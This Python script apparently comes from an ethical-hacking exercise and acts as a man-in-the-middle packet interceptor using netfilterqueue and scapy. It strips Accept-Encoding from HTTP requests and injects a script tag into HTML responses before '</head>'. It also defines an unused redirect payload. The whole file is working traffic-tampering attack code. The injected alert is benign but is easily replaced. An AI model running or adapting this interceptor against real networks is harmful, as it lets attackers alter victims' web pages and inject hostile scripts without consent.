#!/usr/bin/env python

import re
import netfilterqueue
from scapy.packet import Raw
from scapy.layers.inet import IP, TCP

redirect = b"HTTP/1.1 301 Moved Permanently\nLocation: https://arxiv.org/pdf/2105.14943.pdf\n\n" 
payload = b"<script>alert('h4ck3d');</script></head>"

def set_load(packet, load):
    print(packet.show())
    packet[Raw].load = load

    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum

    return packet

def process_packet(packet):
    
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
        if scapy_packet[TCP].dport == 80:
            print("[+] HTTP Request")
            mod_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[Raw].load)
            mod_packet = set_load(scapy_packet, mod_load)
            packet.set_payload(bytes(mod_packet))
            print(scapy_packet.show())
        elif scapy_packet[TCP].sport == 80:
            print("[+] HTTP Response")
            mod_load = scapy_packet[Raw].load.replace(b"</head>", payload)
            mod_packet = set_load(scapy_packet, mod_load)
            packet.set_payload(bytes(mod_packet))
            print(scapy_packet.show())
    
    packet.accept()

def main():
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

if __name__ == "__main__":
    main()
